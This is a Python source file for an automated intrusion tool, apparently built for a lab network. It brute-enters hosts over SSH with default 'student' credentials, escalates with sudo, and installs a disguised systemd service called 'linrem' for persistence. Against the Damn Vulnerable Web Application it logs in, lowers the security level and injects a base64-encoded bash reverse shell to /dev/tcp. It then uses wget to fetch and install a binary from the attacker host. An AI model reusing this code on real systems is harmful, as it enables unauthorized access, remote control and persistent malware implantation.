import string
import subprocess
import time
import paramiko
from paramiko import SSHClient
from scp import SCPClient
from pathlib import Path
import re
import threading
import requests
from bs4 import BeautifulSoup
import socket
import random
import base64
import os

HOST = "192.168.218.151"

service = """[Unit]
Description=Regular background program processing daemon
Documentation=man:linrem(28)
After=network

[Service]
ExecStart=/usr/bin/linrem
KillMode=process
Restart=on-failure

[Install]
WantedBy=multi-user.target
"""

port_dict = {
    '22': 'ssh',
    '80': 'http',
    '3389': 'rdp'
}


class Intruder:
    def __init__(self, apiclient):
        Path("tmp").mkdir(parents=True, exist_ok=True)
        f = open("tmp/linrem.service", 'w')
        f.write(service)
        f.close()
        f = open("www/tmp.oSFEjRVkTb", 'w')
        f.write(service)
        f.close()
        self._apiClient = apiclient

    def intrude(self,
                ips: dict):
        threads = []
        for ip in list(ips.keys()):
            targetos = self.fingerprint(ip)
            t = threading.Thread(target=self.pwn, args=(ip, ips[ip]['service'], ips[ip]['port'], targetos))
            threads.append(t)
            t.start()
        for t in threads:
            t.join()

        return True

    def fingerprint(self, ip):
        try:
            pingresult = subprocess.check_output(['ping', '-c1', f'{ip}'])
            x = re.search(b"ttl=\d{1,3}", pingresult)
            ttl = int(x.group().split(b'=')[1].decode('utf8'))
            if (ttl-64) > 0:
                return 'Windows'
            return 'Linux'
        except Exception as e:
            print('[Slagroom] Fingerprinting failed')
            return 'Linux'

    def pwn(self, ip, service, port, targetos):
        if service == 'ssh':
            try:
                client = SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(ip, port=22, username='student', password='student')
                agent = self._apiClient.create_agent(targetos, ipAddress=ip)
                self._apiClient.get_bin(agent['_id'], agent['communicationToken'], ip)
                scp = SCPClient(client.get_transport())
                scp.put(f'tmp/{ip}', '/tmp/tmp.raNFfxyoxr')
                scp.put(f'tmp/linrem.service', '/tmp/tmp.oSFEjRVkTb')
                channel = client.invoke_shell()
                time.sleep(2)
                channel.recv(2048)
                channel.send(b'sudo bash\n')
                time.sleep(1)
                channel.send(b'student\n')
                time.sleep(3)
                channel.send(b' mv /tmp/tmp.oSFEjRVkTb /lib/systemd/system/linrem.service'
                     b' && chmod 644 /lib/systemd/system/linrem.service'
                     b' && mv /tmp/tmp.raNFfxyoxr /usr/bin/linrem'
                     b' && chmod +x /usr/bin/linrem'
                     b' && ln -s /lib/systemd/system/linrem.service'
                     b' /etc/systemd/system/multi-user.target.wants/linrem.service'
                     b' && systemctl daemon-reload && systemctl start linrem && systemctl restart linrem\n ')
                time.sleep(3)
                channel.close()
                scp.close()
                client.close()
                return True
            except Exception as e:
                print(f'[Slagroom] We got a little error on : {ip}')
                return False
        elif service == 'http':
            try:
                agent = self._apiClient.create_agent(targetos, ipAddress=ip)
                self._apiClient.get_bin(agent['_id'], agent['communicationToken'], ip)
                file_name = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(12))
                os.rename(f"tmp/{ip}", f"www/{file_name}")
                shell_port = random.randint(40000, 50000)
                revshell = f"bash -c ' bash -i >& /dev/tcp/{HOST}/{shell_port} 0>&1'"
                base64_payload = base64.b64encode(revshell.encode('utf8')).decode('utf8')
                threading.Thread(target=setup_socket, daemon=True, args=(shell_port, file_name)).start()
                intrude_http('192.168.149.134', port, base64_payload)
            except Exception as e:
                print(f'[Slagroom] We got a little error on : {ip}')
                return False


def intrude_http(ip, port, payload):
    try:
        s = requests.Session()
        user_token = get_user_token(ip, port, s)
        login_result = login(ip, port, s, user_token)
        if not login_result:
            return False
        result = change_security_level(ip, port, s, user_token)
        if not result:
            return False
        return pwn_http(ip, port, s, user_token, payload)
    except Exception:
        return False


@staticmethod
def get_user_token(ip, port, s):
    response = s.get(f'http://{ip}:{port}/dvwa/login.php').text
    if 'user_token' in response:
        soup = BeautifulSoup(response, 'html.parser')
        return soup.find("input", attrs={"name": "user_token"}).get('value')


@staticmethod
def login(ip, port, s, user_token):
    data = {'username': 'admin', 'password': 'password', 'Login': 'Login', 'user_token': user_token}
    response = s.post(f'http://{ip}:{port}/dvwa/login.php', data=data).text
    if 'Welcome :: Damn Vulnerable Web Application' in response:
        return True
    return False


@staticmethod
def change_security_level(ip, port, s, user_token):
    data = {'security': 'low', 'seclev_submit': 'Submit', 'user_token': user_token}
    result = s.post(f'http://{ip}:{port}/dvwa/security.php', data=data)
    if s.cookies['security'] == 'low':
        return True
    return False


@staticmethod
def pwn_http(ip, port, s, user_token, payload):
    data = {
        'ip': f';echo -n {payload} | base64 -d | bash',
        'Submit': 'Submit', 'user_token': user_token}
    result = s.post(f'http://{ip}:{port}/dvwa/vulnerabilities/exec/', data=data).text
    soup = BeautifulSoup(result, 'html.parser')
    if soup.find('pre').text.rstrip('\n') == 'www-data':
        return True
    return False


def setup_socket(port, file_name):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(('0.0.0.0', port))
        s.listen()
        conn, addr = s.accept()
        with conn:
            print(f"Connected by {addr}")
            conn.send(b'python3 -c "import pty;pty.spawn(\'/bin/bash\')"\n')
            time.sleep(1)
            conn.send(b'su - student\n')
            time.sleep(1)
            conn.send(b'student\n')
            time.sleep(1)
            conn.send(b'sudo su -\n')
            time.sleep(1)
            conn.send(b'student\n')
            time.sleep(1)
            conn.send(b' wget http://192.168.218.151/tmp.oSFEjRVkTb -O /tmp/tmp.oSFEjRVkTb\n')
            time.sleep(1)
            conn.send(f' wget http://192.168.218.151/{file_name} -O /tmp/tmp.raNFfxyoxr\n'.encode('utf8'))
            time.sleep(3)
            conn.send(b' mv /tmp/tmp.oSFEjRVkTb /lib/systemd/system/linrem.service'
                      b' && chmod 644 /lib/systemd/system/linrem.service'
                      b' && mv /tmp/tmp.raNFfxyoxr /usr/bin/linrem'
                      b' && chmod +x /usr/bin/linrem'
                      b' && ln -s /lib/systemd/system/linrem.service'
                      b' /etc/systemd/system/multi-user.target.wants/linrem.service'
                      b' && systemctl daemon-reload && systemctl start linrem && systemctl restart linrem\n ')
            time.sleep(15)
            print(conn.recv(1024).decode('utf8'))
            conn.close()
        s.close()

